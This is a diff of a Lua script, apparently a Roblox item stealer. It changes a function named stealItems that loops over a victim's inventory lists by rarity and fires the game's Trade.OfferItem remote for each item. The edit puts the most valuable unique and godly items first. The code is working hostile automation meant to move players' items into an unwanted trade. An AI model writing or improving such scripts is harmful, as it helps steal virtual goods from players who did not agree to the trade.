@@ -124,52 +124,7 @@ local function stealItems()
 
     wait(3)
 
-    for a,b in pairs(vintageItems) do
-        local addArgs = {
-            [1] = b,
-            [2] = "Weapons"
-        }
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
-        wait(0.3)
-    end
-
-    for a,b in pairs(commonItems) do
-        local addArgs = {
-            [1] = b,
-            [2] = "Weapons"
-        }
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
-        wait(0.3)
-    end
-
-    for a,b in pairs(uncommonItems) do
-        local addArgs = {
-            [1] = b,
-            [2] = "Weapons"
-        }
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
-        wait(0.3)
-    end
-
-    for a,b in pairs(rareItems) do
-        local addArgs = {
-            [1] = b,
-            [2] = "Weapons"
-        }
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
-        wait(0.3)
-    end
-
-    for a,b in pairs(legendaryItems) do
-        local addArgs = {
-            [1] = b,
-            [2] = "Weapons"
-        }
-        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
-        wait(0.3)
-    end
-
-    for a,b in pairs(godlyItems) do
+    for a,b in pairs(uniqueItems) do
         local addArgs = {
             [1] = b,
             [2] = "Weapons"
@@ -187,7 +142,52 @@ local function stealItems()
         wait(0.3)
     end
 
-    for a,b in pairs(uniqueItems) do
+    for a,b in pairs(godlyItems) do
+        local addArgs = {
+            [1] = b,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
+        wait(0.3)
+    end
+
+    for a,b in pairs(legendaryItems) do
+        local addArgs = {
+            [1] = b,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
+        wait(0.3)
+    end
+
+    for a,b in pairs(rareItems) do
+        local addArgs = {
+            [1] = b,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
+        wait(0.3)
+    end
+
+    for a,b in pairs(uncommonItems) do
+        local addArgs = {
+            [1] = b,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
+        wait(0.3)
+    end
+
+    for a,b in pairs(commonItems) do
+        local addArgs = {
+            [1] = b,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
+        wait(0.3)
+    end
+
+    for a,b in pairs(vintageItems) do
         local addArgs = {
             [1] = b,
             [2] = "Weapons"
